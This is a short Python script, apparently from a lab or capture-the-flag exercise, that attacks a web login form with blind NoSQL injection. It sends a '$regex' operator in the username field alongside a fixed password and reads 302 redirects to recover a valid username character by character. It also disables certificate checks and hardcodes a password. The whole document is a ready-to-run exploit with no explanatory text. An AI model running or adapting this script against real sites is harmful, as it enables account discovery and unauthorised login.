import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=''
password='h3mXK8RhU~f{]f5H'
u='http://example.com'
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
	for c in string.printable:
		if c not in ['*','+','.','?','|', '#', '&', '$']:
			payload='username[$regex]=^%s&password[$eq]=%s' % (username + c, password)
			
			
			
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)

			if r.status_code == 302:
				print("user : %s" % (username + c))
				username += c

			
